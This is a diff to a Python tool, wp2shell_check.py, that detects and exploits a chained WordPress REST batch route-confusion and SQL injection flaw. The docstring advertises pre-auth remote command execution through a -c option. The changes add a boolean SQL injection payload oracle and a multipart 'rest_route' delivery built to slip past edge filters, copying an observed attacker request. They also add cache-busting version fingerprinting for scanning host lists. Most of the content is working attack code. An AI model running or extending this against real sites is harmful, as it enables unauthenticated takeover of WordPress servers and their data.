@@ -7,9 +7,20 @@ CVE-2026-63030 (REST /batch/v1 route confusion) + CVE-2026-60137
 
 What it does
 ------------
-**Detect (default):** Confirms the *unauthenticated SQL injection* with a time-based
-differential. Reads no data and changes nothing. `--proof` reads two harmless scalars
-(@@version, current_user()) as evidence — still read-only.
+**Detect (default):** Confirms the *unauthenticated SQL injection*, automatically, with
+fallback on two independent axes so a single blocked path never yields a false negative:
+
+  * **oracle** (`--method auto`): a fast **boolean row-count differential** (flip the injected
+    WHERE true `1=1` vs false `1=12`, watch the confused posts query's row count collapse — no
+    SLEEP) first; if it doesn't fire, the original **time-based SLEEP** differential.
+  * **delivery** (`--delivery auto`): a **JSON** POST to the batch route first; if that isn't
+    processed (e.g. an edge blocks `/wp-json`), a **`rest_route=/batch/v1` multipart form on
+    `POST /`** (the exact operator request shape).
+
+Each strategy is tried until one *confirms*; only when all come up empty is a target reported
+negative. Override with `--method boolean|time` / `--delivery json|multipart` (`--multipart` is
+an alias). Reads no data and changes nothing. `--proof` reads two harmless scalars (@@version,
+current_user()) as evidence — still read-only.
 
 **Exploit (`-c COMMAND`):** Full pre-auth RCE on stock WordPress — no FILE privilege, no
 object cache, no plugins, no misconfigurations required. The chain:
@@ -31,7 +42,9 @@ targets require --authorized.
 
 Usage
 -----
-    python3 wp2shell_check.py http://target[:port]           # detect only
+    python3 wp2shell_check.py http://target[:port]           # detect (auto oracle + delivery)
+    python3 wp2shell_check.py http://target --method time    # force the SLEEP oracle
+    python3 wp2shell_check.py http://target --delivery multipart  # force rest_route form on /
     python3 wp2shell_check.py http://target --proof          # + read @@version as evidence
     python3 wp2shell_check.py http://target -c "id"          # full pre-auth RCE
     python3 wp2shell_check.py -f hosts.txt --authorized --json
@@ -69,7 +82,7 @@ import zipfile
 from collections import Counter
 from http.cookiejar import CookieJar
 
-__version__ = "2.0.0"
+__version__ = "2.2.1"
 
 
 class _KeepPost(urllib.request.HTTPRedirectHandler):
@@ -88,13 +101,19 @@ class _KeepPost(urllib.request.HTTPRedirectHandler):
 
 
 class Target:
-    def __init__(self, base, timeout=15, proxy=None, sleep=4.0, route="auto"):
+    def __init__(self, base, timeout=15, proxy=None, sleep=4.0, route="auto", delivery="auto"):
         self.base = base.rstrip("/")
         self.timeout = timeout
         self.sleep = float(sleep)
         self.route = route
+        # delivery: "auto" (probe JSON, fall back to multipart if JSON isn't processed),
+        # "json" (POST body to /wp-json|rest_route batch), or "multipart" (rest_route form on /).
+        self.delivery = delivery
+        self.multipart = (delivery == "multipart")  # current on-the-wire delivery for _send()
+        self._delivery_resolved = (delivery != "auto")
         self._proxy = proxy
         self.batch = None        # resolved endpoint URL (canonical, post-redirect)
+        self._mp_ep = None       # resolved multipart endpoint (root vs /index.php)
         self._base = 0.0         # measured baseline round-trip (set by detect(); used by the oracle)
         self._normalized = False # whether the base host/scheme has been canonicalized
         # Ignore TLS verification (self-signed / expired / hostname-mismatch certs are
@@ -176,10 +195,63 @@ class Target:
             {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
         ]}
 
-    def probe(self, author_exclude):
-        """Send one injection carrying <author_exclude> into author__not_in. Returns (status, elapsed)."""
+    # -- multipart (rest_route form) delivery -------------------------------
+    # WordPress reads the public query var `rest_route` from $_POST in WP::parse_request(),
+    # so the whole nested batch can ride as multipart form fields on POST / — no JSON, no
+    # /wp-json path. This is the exact shape of the observed operator request and slips past
+    # edges that filter JSON bodies to /wp-json/batch/v1.
+    @staticmethod
+    def _flatten_fields(envelope):
+        """Flatten the nested batch envelope into ordered PHP-array form fields, e.g.
+        requests[0][method], requests[2][body][requests][1][path]. Order is preserved,
+        which the desync depends on."""
+        fields = []
+
+        def rec(name, val):
+            if isinstance(val, dict):
+                for k, v in val.items():
+                    rec("%s[%s]" % (name, k), v)
+            elif isinstance(val, list):
+                for i, v in enumerate(val):
+                    rec("%s[%d]" % (name, i), v)
+            else:
+                fields.append((name, "" if val is None else str(val)))
+
+        for i, req in enumerate(envelope["requests"]):
+            rec("requests[%d]" % i, req)
+        return fields
+
+    @staticmethod
+    def _multipart_encode(fields):
+        boundary = "----WebKitFormBoundary%s" % secrets.token_hex(8)
+        out = []
+        for name, value in fields:
+            out.append(("--%s\r\nContent-Disposition: form-data; name=\"%s\"\r\n\r\n%s\r\n"
+                        % (boundary, name, value)).encode())
+        out.append(("--%s--\r\n" % boundary).encode())
+        return "multipart/form-data; boundary=%s" % boundary, b"".join(out)
+
+    def _send(self, author_exclude):
+        """Deliver one injection carrying <author_exclude> into author__not_in.
+        Returns (status, elapsed, body_bytes). Honors self.multipart."""
         self._normalize_base()
-        body = json.dumps(self._envelope(author_exclude)).encode()
+        env = self._envelope(author_exclude)
+        if self.multipart:
+            fields = [("rest_route", "/batch/v1"), ("validation", "normal")]
+            fields += self._flatten_fields(env)
+            ctype, body = self._multipart_encode(fields)
+            hdrs = {"Content-Type": ctype}
+            if self._mp_ep is None:
+                for ep in (self.base + "/", self.base + "/index.php"):
+                    st, el, resp, _ = self._raw(ep, data=body, headers=hdrs, method="POST")
+                    if st in (200, 207):
+                        self._mp_ep = ep
+                        return st, el, resp
+                self._mp_ep = self.base + "/"  # nothing processed; keep root, timing/rows decide
+            st, el, resp, _ = self._raw(self._mp_ep, data=body, headers=hdrs, method="POST")
+            return st, el, resp
+        # JSON delivery (default)
+        body = json.dumps(env).encode()
         headers = {"Content-Type": "application/json"}
         if self.batch is None:
             # resolve which endpoint form the site accepts (a processed batch answers 207/200);
@@ -191,7 +263,12 @@ class Target:
                     break
             if self.batch is None:
                 self.batch = self._endpoints()[0]  # fall back; timing still decides
-        st, el, _, _ = self._raw(self.batch, data=body, headers=headers, method="POST")
+        st, el, resp, _ = self._raw(self.batch, data=body, headers=headers, method="POST")
+        return st, el, resp
+
+    def probe(self, author_exclude):
+        """Send one injection into author__not_in. Returns (status, elapsed)."""
+        st, el, _ = self._send(author_exclude)
         return st, el
 
     @staticmethod
@@ -207,6 +284,157 @@ class Target:
         # vulnerable if the slow path tracks our injected sleep and the fast path did not
         vulnerable = delta >= (self.sleep * 0.6) and fast < (self.sleep * 0.5)
         return {"fast": fast, "slow": slow, "delta": delta, "vulnerable": vulnerable}
+
+    # -- boolean (row-count) detection -------------------------------------
+    # No SLEEP: flip the injected WHERE true (1=1) vs false (1=12) and read the confused
+    # posts query's row count. True -> rows returned (the `-- -` also truncates the
+    # status/pagination clauses, so X-WP-Total climbs); false -> zero rows. A stable
+    # true>0 / false==0 differential is the injection firing. Faster than timing and
+    # immune to SLEEP being filtered or optimized away on managed hosts.
+    @staticmethod
+    def _bool_payload(truth):
+        return "0) AND 1=%d-- -" % (1 if truth else 12)
+
+    @staticmethod
+    def _harvest(body):
+        """Walk a (possibly nested) batch response; return (max X-WP-Total seen or None,
+        count of post-like objects) across every sub-response. Robust to desync index shifts."""
+        try:
+            doc = json.loads(body)
+        except Exception:
+            return None, 0
+        totals, posts = [], [0]
+
+        def walk(o):
+            if isinstance(o, dict):
+                h = o.get("headers")
+                if isinstance(h, dict) and "X-WP-Total" in h:
+                    try:
+                        totals.append(int(h["X-WP-Total"]))
+                    except (TypeError, ValueError):
+                        pass
+                for v in o.values():
+                    walk(v)
+            elif isinstance(o, list):
+                if o and all(isinstance(e, dict) for e in o) and any(
+                        "id" in e and ("title" in e or "content" in e or "slug" in e) for e in o):
+                    posts[0] += sum(1 for e in o if "id" in e)
+                for e in o:
+                    walk(e)
+
+        walk(doc)
+        return (max(totals) if totals else None), posts[0]
+
+    @staticmethod
+    def _has_responses(body):
+        """True if <body> parses as a processed batch (a 'responses' array anywhere).
+        Distinguishes 'delivery reached the batch handler' from 'blocked / not WordPress'."""
+        try:
+            doc = json.loads(body)
+        except Exception:
+            return False
+
+        def walk(o):
+            if isinstance(o, dict):
+                if isinstance(o.get("responses"), list):
+                    return True
+                return any(walk(v) for v in o.values())
+            if isinstance(o, list):
+                return any(walk(e) for e in o)
+            return False
+
+        return walk(doc)
+
+    def detect_boolean(self):
+        """Row-count differential. Returns a dict incl. {'vulnerable': bool, 'processed': bool}.
+        'processed' means the current delivery reached the batch handler (so a negative is a
+        real negative, not a blocked delivery that the caller should retry another way)."""
+        try:
+            _, _, tb = self._send(self._bool_payload(True))
+            _, _, fb = self._send(self._bool_payload(False))
+        except urllib.error.URLError:
+            return {"vulnerable": False, "processed": False, "signal": "none",
+                    "true_total": None, "false_total": None,
+                    "true_posts": 0, "false_posts": 0, "true_len": 0, "false_len": 0}
+        t_total, t_posts = self._harvest(tb)
+        f_total, f_posts = self._harvest(fb)
+        by_total = (t_total is not None and f_total is not None and t_total > 0 and f_total == 0)
+        by_posts = (t_posts > 0 and f_posts == 0)
+        by_len = ((len(tb) - len(fb)) > 200 and f_posts == 0 and t_posts > 0)
+        signal = ("x-wp-total" if by_total else "post-count" if by_posts
+                  else "body-length" if by_len else "none")
+        processed = self._has_responses(tb) or self._has_responses(fb)
+        return {"vulnerable": bool(by_total or by_posts or by_len), "processed": processed,
+                "signal": signal, "true_total": t_total, "false_total": f_total,
+                "true_posts": t_posts, "false_posts": f_posts,
+                "true_len": len(tb), "false_len": len(fb)}
+
+    # -- delivery resolution + method orchestration ------------------------
+    def _set_delivery(self, name):
+        self.multipart = (name == "multipart")
+
+    def _delivery_name(self):
+        return "multipart" if self.multipart else "json"
+
+    def _batch_processes(self):
+        """Cheap benign probe: does the *current* delivery reach the batch handler?"""
+        try:
+            st, _, body = self._send("0")
+        except urllib.error.URLError:
+            return False
+        return st in (200, 207) and self._has_responses(body)
+
+    def _resolve_delivery(self):
+        """For delivery=auto, pin JSON if it reaches the batch handler, else multipart.
+        Used by the RCE/proof paths that call detect()/oracle directly."""
+        if self._delivery_resolved:
+            return
+        self._delivery_resolved = True
+        self._set_delivery("json")
+        if self._batch_processes():
+            return
+        self._set_delivery("multipart")
+        if self._batch_processes():
+            return
+        self._set_delivery("json")  # neither processed; timing/rows will read negative anyway
+
+    def detect_auto(self, method="auto", rounds=3):
+        """Automatic detection with fallback across both axes:
+          oracle:   boolean (fast, no SLEEP)  ->  time (SLEEP differential)
+          delivery: json  ->  multipart (rest_route form), when json isn't processed
+        Tries each until one CONFIRMS; returns the confirming (method, delivery). A genuine
+        failure of one strategy (error, delivery blocked, oracle gives no signal) falls
+        through to the next; only when all configured strategies come up empty is it negative."""
+        deliveries = ["json", "multipart"] if self.delivery == "auto" else [self.delivery]
+        boo_by_delivery = {}
+
+        # 1) boolean oracle across deliveries (each is cheap: 2 requests)
+        if method in ("auto", "boolean"):
+            for d in deliveries:
+                self._set_delivery(d)
+                boo = self.detect_boolean()
+                boo_by_delivery[d] = boo
+                if boo["vulnerable"]:
+                    return {"vulnerable": True, "method": "boolean", "delivery": d, "boolean": boo}
+
+        # 2) time oracle. Run it once, on a delivery already proven to reach the batch handler
+        #    (avoids paying the SLEEP cost twice); fall back to the first candidate otherwise.
+        last_time = None
+        if method in ("auto", "time"):
+            proc = [d for d in deliveries if boo_by_delivery.get(d, {}).get("processed")]
+            for d in (proc[:1] or deliveries[:1]):
+                self._set_delivery(d)
+                det = self.detect(rounds=rounds)
+                last_time = (d, det)
+                if det["vulnerable"]:
+                    return {"vulnerable": True, "method": "time", "delivery": d, "time": det}
+
+        # nothing confirmed
+        neg_delivery = (last_time[0] if last_time else
+                        (deliveries[0] if deliveries else self._delivery_name()))
+        self._set_delivery(neg_delivery)
+        return {"vulnerable": False, "method": None, "delivery": neg_delivery,
+                "boolean": boo_by_delivery, "time": (last_time[1] if last_time else None)}
 
     # -- bounded read-only proof -------------------------------------------
     def _oracle(self, cond, unit=0.6):
@@ -549,11 +777,22 @@ def _ver_tuple(s):
 
 
 def fingerprint_version(t):
-    for path, pat in (("/", r'content="WordPress\s+([0-9.]+)"'),
-                      ("/readme.html", r"Version\s+([0-9.]+)"),
-                      ("/feed/", r"<generator>\s*https?://wordpress\.org/\?v=([0-9.]+)")):
+    # Cache-bust every read: a CDN (Cloudflare/Akamai) in front of WordPress caches the HTML
+    # homepage, so a plain fetch can return a STALE generator meta from before an auto-update —
+    # which misfingerprints a patched site as an affected version. A unique query param + no-cache
+    # headers force an origin MISS. Core-asset ?ver= (block-library/emoji/wp-embed) is the most
+    # reliable signal since it is stamped with the running WP version at build time.
+    cb = "wpcb%s" % secrets.token_hex(4)
+    nocache = {"Cache-Control": "no-cache", "Pragma": "no-cache"}
+    core_asset = (r'(?:block-library/style(?:\.min)?\.css|wp-emoji-release(?:\.min)?\.js'
+                  r'|wp-embed(?:\.min)?\.js)\?ver=([0-9]+\.[0-9]+(?:\.[0-9]+)?)')
+    for path, pat in (("/", core_asset),
+                      ("/", r'content="WordPress\s+([0-9.]+)"'),
+                      ("/feed/", r"<generator>\s*https?://wordpress\.org/\?v=([0-9.]+)"),
+                      ("/readme.html", r"Version\s+([0-9.]+)")):
+        url = t.base + path + ("&" if "?" in path else "?") + cb
         try:
-            _, _, body, _ = t._raw(t.base + path)
+            _, _, body, _ = t._raw(url, headers=nocache)
             m = re.search(pat, body.decode("utf-8", "replace"))
             if m:
                 return m.group(1)
@@ -580,20 +819,33 @@ def is_local(base):
 
 
 def scan_one(url, args):
-    t = Target(url, timeout=args.timeout, proxy=args.proxy, sleep=args.sleep, route=args.route)
+    t = Target(url, timeout=args.timeout, proxy=args.proxy, sleep=args.sleep,
+               route=args.route, delivery=args.delivery)
     rec = {"target": url}
+    # automatic oracle + delivery selection with fallback (see Target.detect_auto)
     try:
-        det = t.detect(rounds=args.rounds)
+        res = t.detect_auto(method=args.method, rounds=args.rounds)
     except urllib.error.URLError as e:
         rec.update(status="error", error=str(e.reason))
         return rec, 2
+    active = res["vulnerable"]
+    rec["delivery"] = res.get("delivery")
+    if active:
+        rec["method"] = res["method"]
+        if res["method"] == "boolean":
+            boo = res["boolean"]
+            rec["bool_signal"] = boo["signal"]
+            rec["bool_true_rows"] = boo["true_total"] if boo["true_total"] is not None else boo["true_posts"]
+            rec["bool_false_rows"] = boo["false_total"] if boo["false_total"] is not None else boo["false_posts"]
+    # surface time evidence whenever the SLEEP oracle actually ran (confirm or negative)
+    det = res.get("time")
+    if isinstance(det, dict) and "fast" in det:
+        rec["fast_s"] = round(det["fast"], 3)
+        rec["slow_s"] = round(det["slow"], 3)
+        rec["delta_s"] = round(det["delta"], 3)
     ver = fingerprint_version(t)
     rec["wp_version"] = ver
     rec["version_verdict"] = version_verdict(ver)
-    rec["fast_s"] = round(det["fast"], 3)
-    rec["slow_s"] = round(det["slow"], 3)
-    rec["delta_s"] = round(det["delta"], 3)
-    active = det["vulnerable"]
     vv = rec["version_verdict"]
     rec["active_check"] = "fired" if active else "negative"
     if active:
@@ -612,6 +864,13 @@ def scan_one(url, args):
         rec["status"] = "not_vulnerable"
     code = 0 if rec["status"] in ("vulnerable", "affected_version") else 1
     if active and args.proof:
+        # read_scalar uses the time-based oracle; establish a latency baseline if the
+        # boolean method confirmed without ever running the timing probe.
+        if t._base <= 0:
+            try:
+                t.detect(rounds=args.rounds)
+            except urllib.error.URLError:
+                pass
         try:
             rec["proof"] = {"@@version": t.read_scalar("SELECT @@version", 40),
                             "current_user()": t.read_scalar("SELECT CURRENT_USER()", 48)}
@@ -628,9 +887,18 @@ def human(rec):
         line += "  (WordPress %s, %s)" % (rec["wp_version"], rec["version_verdict"])
     if rec["status"] == "error":
         line += "  -- %s" % rec.get("error")
-    elif "delta_s" in rec:
-        line += "  [active=%s fast=%.2fs slow=%.2fs delta=%.2fs]" % (
-            rec.get("active_check", "?"), rec["fast_s"], rec["slow_s"], rec["delta_s"])
+    else:
+        bits = []
+        if rec.get("method") == "boolean":
+            bits.append("method=boolean rows(true/false)=%s/%s via %s" % (
+                rec.get("bool_true_rows"), rec.get("bool_false_rows"), rec.get("bool_signal")))
+        if "delta_s" in rec:
+            bits.append("method=time fast=%.2fs slow=%.2fs delta=%.2fs" % (
+                rec["fast_s"], rec["slow_s"], rec["delta_s"]))
+        if rec.get("delivery"):
+            bits.append("delivery=%s" % rec["delivery"])
+        if bits:
+            line += "  [active=%s | %s]" % (rec.get("active_check", "?"), " | ".join(bits))
     out = [line]
     if rec.get("note"):
         out.append("        note: " + rec["note"])
@@ -650,6 +918,16 @@ def main():
     p.add_argument("--proof", action="store_true",
                    help="read @@version + current_user() as evidence (read-only)")
     p.add_argument("--route", choices=("auto", "rest-route", "wp-json"), default="auto")
+    p.add_argument("--method", choices=("auto", "boolean", "time"), default="auto",
+                   help="detection oracle. auto (default) tries the fast boolean row-count "
+                        "differential first and falls back to the time-based SLEEP oracle; "
+                        "boolean/time force one.")
+    p.add_argument("--delivery", choices=("auto", "json", "multipart"), default="auto",
+                   help="batch delivery. auto (default) uses a JSON POST to the batch route and "
+                        "falls back to a rest_route=/batch/v1 multipart form on POST / if the JSON "
+                        "batch isn't processed (e.g. an edge blocks /wp-json). json/multipart force one.")
+    p.add_argument("--multipart", action="store_true",
+                   help="alias for --delivery multipart (the exact operator request shape)")
     p.add_argument("--sleep", type=float, default=4.0, help="injected SLEEP seconds (default 4)")
     p.add_argument("--rounds", type=int, default=3, help="median over N probes (default 3)")
     p.add_argument("--timeout", type=float, default=15.0)
@@ -660,6 +938,8 @@ def main():
                    help="assert authorization for remote targets")
     p.add_argument("--json", action="store_true", help="emit JSON")
     args = p.parse_args()
+    if args.multipart:
+        args.delivery = "multipart"
 
     # -- RCE mode (-c COMMAND) ------------------------------------------------
     if args.command:
@@ -668,8 +948,9 @@ def main():
         url = args.url if "://" in args.url else "http://" + args.url
         if not is_local(url) and not args.authorized:
             p.error("-c on remote targets requires --authorized")
+        # RCE forge + extraction is JSON end-to-end and needs the timing oracle baseline.
         t = Target(url, timeout=max(args.timeout, 30), proxy=args.proxy,
-                   sleep=args.sleep, route=args.route)
+                   sleep=args.sleep, route=args.route, delivery="json")
         try:
             det = t.detect(rounds=args.rounds)
         except urllib.error.URLError as e:
